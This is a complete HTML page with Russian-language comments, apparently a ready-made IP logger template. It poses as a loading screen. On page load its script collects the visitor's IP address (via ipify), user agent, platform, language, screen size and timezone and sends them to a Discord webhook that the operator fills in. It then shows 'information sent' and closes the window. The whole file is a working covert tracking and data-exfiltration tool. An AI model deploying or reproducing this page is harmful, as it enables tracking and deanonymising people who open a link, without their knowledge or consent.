<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Info</title>
</head>
<body>
    <h1>Загрузка...</h1>
    <p>Пожалуйста, подождите.</p>
    <script>
        // ===== КОНФИГУРАЦИЯ: ВСТАВЬТЕ СВОЙ WEBHOOK =====
        const WEBHOOK_URL = "https://discord.com/api/webhooks/ВАШ_ИД/ВАШ_ТОКЕН";

        // ===== СБОР ДАННЫХ =====
        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };
        }

        function getIP(callback) {
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(data => callback(data.ip))
                .catch(() => callback('IP не получен'));
        }

        function sendData(ip, device) {
            const payload = {
                content: `**IP:** ${ip}\n**User-Agent:** ${device.userAgent}\n**Platform:** ${device.platform}\n**Language:** ${device.language}\n**Screen:** ${device.screenWidth}x${device.screenHeight}\n**Timezone:** ${device.timezone}\n**Time:** ${device.timestamp}`
            };
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(e => console.error(e));
        }

        // ===== ЗАПУСК =====
        const device = getDeviceInfo();
        getIP(function(ip) {
            sendData(ip, device);
            document.body.innerHTML = '<h1>✅ Информация отправлена</h1><p>Спасибо, страница закроется через 3 секунды.</p>';
            setTimeout(() => window.close(), 3000);
        });
    </script>
</body>
</html>
